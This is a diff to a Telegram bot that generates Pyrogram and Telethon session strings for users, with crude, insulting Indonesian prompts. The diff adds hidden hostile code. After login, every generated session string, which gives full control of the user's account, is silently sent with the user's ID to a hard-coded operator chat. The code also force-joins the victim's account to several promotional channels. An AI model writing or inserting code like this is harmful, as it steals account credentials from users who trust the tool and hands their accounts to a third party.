@@ -2,9 +2,14 @@ import asyncio
 from telethon import TelegramClient
 from pyrogram.types import Message
 from pyrogram import Client, filters
+from pyrogram1 import Client as Client1
 from asyncio.exceptions import TimeoutError
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telethon.errors import rpcerrorlist
+from pyrogram.errors import UserBannedInChannel
+import telethon
+import pyrogram
 from pyrogram.errors import (
     ApiIdInvalid,
     PhoneNumberInvalid,
@@ -14,6 +19,17 @@ from pyrogram.errors import (
     PasswordHashInvalid
 )
 
+from pyrogram1.errors import (
+    ApiIdInvalid as ApiIdInvalid1,
+    PhoneNumberInvalid as PhoneNumberInvalid1,
+    PhoneCodeInvalid as PhoneCodeInvalid1,
+    PhoneCodeExpired as PhoneCodeExpired1,
+    SessionPasswordNeeded as SessionPasswordNeeded1,
+    PasswordHashInvalid as PasswordHashInvalid1
+)
+from Amang.core.listen.listen import ListenerTimeout
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.errors import (
     ApiIdInvalidError,
     PhoneNumberInvalidError,
@@ -22,6 +38,7 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PasswordHashInvalidError
 )
+
 from env import API_ID, API_HASH
 from data import Data
 
@@ -29,28 +46,34 @@ from data import Data
 ask_ques = "<b>String Session Mana Yang ingin anda Buat?</b>"
 buttons_ques = [
     [
-        InlineKeyboardButton("ᴘʏʀᴏɢʀᴀᴍ", callback_data="pyrogram"),
-        InlineKeyboardButton("ᴛᴇʟᴇᴛʜᴏɴ", callback_data="telethon"),
+        InlineKeyboardButton("Pyrogram V1", callback_data="pyrogram1"),
+        InlineKeyboardButton("Pyrogram V2", callback_data="pyrogram"),
+    ],
+    [    InlineKeyboardButton("Telethon", callback_data="telethon"),
     ],
 
 ]
 
-
 @Client.on_message(filters.private & ~filters.forwarded & filters.command('generate'))
 async def main(_, msg):
-    await msg.reply(ask_ques, reply_markup=InlineKeyboardMarkup(buttons_ques))
+    await msg.reply(ask_ques.format(msg.from_user.mention), reply_markup=InlineKeyboardMarkup(buttons_ques))
 
 
-async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bool = False):
+async def generate_session(bot: Client, msg: Message, telethon=False, old_pyro: bool = False, is_bot: bool = False):
     if telethon:
         ty = "Telethon"
     else:
-        ty = "Pyrogram v2"
+        ty = "Pyrogram"
+        if not old_pyro:
+            ty += " v2"
     if is_bot:
-        ty += " Bot"
+        ty += " 𝐁𝐎𝐓"
     user_id = msg.chat.id
     api_id = API_ID
     api_hash = API_HASH
+    api_hash_msg = await msg.chat.ask("**Lu yakin mo buat string ? Deak Gua Ga Mao Tanggung Jawab ! Balas `Y` Untuk Setuju atau ketik /cancel Untuk Batal**", filters=filters.text)
+    if await cancelled(api_hash_msg):
+            return
     """
     if await cancelled(api_id):
         return
@@ -59,32 +82,29 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
     except ValueError:
         await api_id_msg.reply('Not a valid API_ID (which must be an integer). Please start generating session again.', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
         return
-    api_hash_msg = await bot.ask(user_id, 'Please send your `API_HASH`', filters=filters.text)
+    api_hash_msg = await msg.chat.ask('Please send your `API_HASH`', filters=filters.text)
     if await cancelled(salah):
         return
     api_hash = api_hash_msg.text
     """
     await asyncio.sleep(1.0)
     if not is_bot:
-        t = "**Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format Kode Negara.** \n**Contoh: +628xnxx**"
+        t = "**Sekarang Kirim Nomer Akun Telegram Lu. \nContoh : `+62857XXXXX`\n\nKetik /cancel untuk membatalkan.**"
     else:
-        t = "Now please send your `BOT_TOKEN` \nExample : `12345:abcdefghijklmnopqrstuvwxyz`'"
-    phone_number_msg = await bot.ask(user_id, t, filters=filters.text)
+        t = "**Kirim Nomer Akun Telegram Lu.** \n**Contoh** : `+62857XXXXX` "
+    phone_number_msg = await msg.chat.ask(t, filters=filters.text)
     if await cancelled(phone_number_msg):
         return
     phone_number = phone_number_msg.text
-    if not is_bot:
-        await msg.reply("**Mengirim Kode OTP...**")
-    else:
-        await msg.reply("**Mengirim Kode OTP...**")
-    if telethon and is_bot:
-        client = TelegramClient(StringSession(), api_id=api_id, api_hash=api_hash)
-    elif telethon:
+    await msg.reply("**Lagi Ngirim OTP Ke Akun Lu...**")
+    if telethon and is_bot or telethon:
         client = TelegramClient(StringSession(), api_id=api_id, api_hash=api_hash)
     elif is_bot:
-        client = Client(name=f"bot_{user_id}", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
+        client = Client(name="bot", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
+    elif old_pyro:
+        client = Client1(":memory:", api_id=api_id, api_hash=api_hash)
     else:
-        client = Client(name=f"user_{user_id}", api_id=api_id, api_hash=api_hash, in_memory=True)
+        client = Client(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
     await client.connect()
     try:
         code = None
@@ -93,20 +113,18 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
                 code = await client.send_code_request(phone_number)
             else:
                 code = await client.send_code(phone_number)
-    #except (ApiIdInvalid, ApiIdInvalidError):
-        #await msg.reply('`API_ID` and `API_HASH` combination is invalid. Please start generating session again.', reply_markup=InlineKeyboardMarkup(Data.generate_button))
-        #return
-    except (PhoneNumberInvalid, PhoneNumberInvalidError):
-        await msg.reply('**NOMOR_TELEPON Yang anda masukan salah atau tidak terdaftar\nHarap Gunakan Format Kode Negara. Contoh: +628xnxx\n\nSilakan mulai membuat sesi lagi.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+
+    except (PhoneNumberInvalid, PhoneNumberInvalidError, PhoneNumberInvalid1):
+        await msg.reply('**Nomer Akun Telegram Lu Ga Terdaftar Jink.**\n**Yang Bener Dikit Blog, Dari Ulang.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
         return
     try:
         phone_code_msg = None
         if not is_bot:
-            phone_code_msg = await bot.ask(user_id, "**Silakan Periksa Kode OTP dari Akun Telegram Resmi.\nJika Kode OTP adalah 12345 Tolong [ TAMBAHKAN SPASI ] kirimkan Seperti ini 1 2 3 4 5** \n **Gunakan /cancel untuk Membatalkan Proses Pengambilan String!.**", filters=filters.text, timeout=600)
+            phone_code_msg = await msg.chat.ask("**Sekarang Lu periksa OTP Di Akun Telegram Lu, Buru cepet kirim OTP ke sini.** \n **Cara Masukin OTP kek gini** `1 2 3 4 5`\n**Jangan Salah Ya Broh.**", filters=filters.text, timeout=600)
             if await cancelled(phone_code_msg):
                 return
     except TimeoutError:
-        await msg.reply('**membatalkan proses pengambilan string karena\nlimit waktu terlampaui.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+        await msg.reply('**Ngaret Lu Anjeng Lama...**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
         return
     if not is_bot:
         phone_code = phone_code_msg.text.replace(" ", "")
@@ -115,45 +133,59 @@ async def generate_session(bot: Client, msg: Message, telethon=False, is_bot: bo
                 await client.sign_in(phone_number, phone_code, password=None)
             else:
                 await client.sign_in(phone_number, code.phone_code_hash, phone_code)
-        except (PhoneCodeInvalid, PhoneCodeInvalidError):
-            await msg.reply('**Kode OTP Yang anda masukan Tidak ditambahkan SPASI atau KODE OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+        except (PhoneCodeInvalid, PhoneCodeInvalidError, PhoneCodeInvalid1):
+            await msg.reply('**Kode Nya Salah Monyet, Mata Lu Buta Apa Gimana.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
             return
-        except (PhoneCodeExpired, PhoneCodeExpiredError):
-            await msg.reply('**Kode OTP Yang anda masukan Tidak ditambahkan SPASI atau KODE OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+        except (PhoneCodeExpired, PhoneCodeExpiredError, PhoneCodeExpired1):
+            await msg.reply('**Goblok, Dibilang Pake Spasi Tiap Kode.**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
             return
-        except (SessionPasswordNeeded, SessionPasswordNeededError):
+        except (SessionPasswordNeeded, SessionPasswordNeededError, SessionPasswordNeeded1):
             try:
-                two_step_msg = await bot.ask(user_id, '**Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.**', filters=filters.text, timeout=300)
-            except TimeoutError:
-                await msg.reply('**membatalkan proses pengambilan string karena\nlimit waktu terlampaui.**', reply_markup=InlineKeyboardMarkup(Data.generate_button))
+                two_step_msg = await msg.chat.ask('**Masukin Password Akun Lu Jing.**', filters=filters.text, timeout=300)
+            except ListenerTimeout:
+                await msg.reply('**Anjeng, Demen Banget Ngaret Jadi Manusia**', reply_markup=InlineKeyboardMarkup(goblok_jamet))
                 return
             try:
-                salah = await msg.reply("**Berhasil Membuat String Session**")
                 password = two_step_msg.text
                 if telethon:
                     await client.sign_in(password=password)
                 else:
                     await client.check_password(password=password)
-                if await cancelled(salah):
+                if await cancelled(api_hash_msg):
                     return
-            except (PasswordHashInvalid, PasswordHashInvalidError):
-                await two_step_msg.reply('**Kata Sandi yang Diberikan Tidak Valid. Silakan mulai membuat sesi lagi.**', quote=True, reply_markup=InlineKeyboardMarkup(Data.generate_button))
+            except (PasswordHashInvalid, PasswordHashInvalidError, PasswordHashInvalid1):
+                await two_step_msg.reply('**Lu Pikun Apa Gimana Si Nyet, Password Sendiri Salah.**', quote=True, reply_markup=InlineKeyboardMarkup(goblok_jamet))
                 return
+    elif telethon:
+        await client.start(bot_token=phone_number)
     else:
-        if telethon:
-            await client.start(bot_token=phone_number)
-        else:
-            await client.sign_in_bot(phone_number)
+        await client.sign_in_bot(phone_number)
     if telethon:
         string_session = client.session.save()
     else:
         string_session = await client.export_session_string()
-    text = f"**String Session {ty.upper()} Berhasil Dibuat** \n\n`{string_session}` \n\n**Support : @amwangs**"
+    text = f"**{ty.upper()} NIH JING.** \n\n`{string_session}` \n\n**Minimal Bilang Makasih Ke** @amwang **Atau Ke** @amwangsupport **Karna Akun Lu Kaga Deak**"
     try:
+        try:
+            if telethon:
+                await client(JoinChannelRequest("amwangsupport"))
+                await client(JoinChannelRequest("amwangs"))
+                await client(JoinChannelRequest("amangproject"))
+                await client(JoinChannelRequest("jualtelprem"))
+            else:
+                await client.join_chat("amwangs")
+                await client.join_chat("amangproject")
+                await client.join_chat("amwangsupport")
+                await client.join_chat("jualtelprem")
+        except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
+            await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
+            return
         if not is_bot:
             await bot.send_message(msg.chat.id, text)
+            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
         else:
             await bot.send_message(msg.chat.id, text)
+            await bot.send_message(-1001989801027, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
     except KeyError:
         pass
     await client.disconnect()
